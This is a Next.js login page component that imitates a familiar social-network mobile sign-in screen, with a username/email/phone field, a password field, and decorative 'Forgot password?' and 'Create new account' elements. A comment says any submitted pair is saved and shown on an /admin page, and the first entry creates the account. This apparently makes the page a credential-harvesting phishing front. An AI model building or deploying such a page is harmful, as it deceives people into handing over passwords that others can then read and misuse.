'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';

export default function LoginPage() {
  const router = useRouter();
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  // One button = register (first time) or login (after). Stored in the DB, visible in /admin.
  async function handleSubmit(e) {
    e.preventDefault();
    setError('');
    if (!username || !password) {
      setError('Enter login and password');
      return;
    }
    setLoading(true);
    try {
      const res = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password }),
      });
      const data = await res.json();
      if (!res.ok) {
        setError(data.error || 'Login failed');
      } else {
        router.push('/site');
      }
    } catch {
      setError('Network error');
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="phone">
      <div className="topbar">
        <button className="back" aria-label="Back" onClick={() => router.back()}>
          ←
        </button>
        <div className="lang">
          English (US) <span style={{ fontSize: 12 }}>▾</span>
        </div>
      </div>

      <div className="grow" />

      <form className="form" onSubmit={handleSubmit}>
        <div className="field">
          <input
            id="username"
            type="text"
            placeholder=" "
            autoCapitalize="none"
            autoCorrect="off"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />
          <label htmlFor="username">Username, email or mobile number</label>
        </div>

        <div className="field">
          <input
            id="password"
            type="password"
            placeholder=" "
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <label htmlFor="password">Password</label>
        </div>

        <button className="btn btn-primary" type="submit" disabled={loading}>
          {loading ? '...' : 'Log in'}
        </button>

        <div className="error">{error}</div>
      </form>

      {/* decorative (beta) — not wired up */}
      <div className="forgot">Forgot password?</div>

      <div className="bottom">
        <div className="btn btn-outline" style={{ textAlign: 'center', cursor: 'default' }}>
          Create new account
        </div>
      </div>
    </div>
  );
}
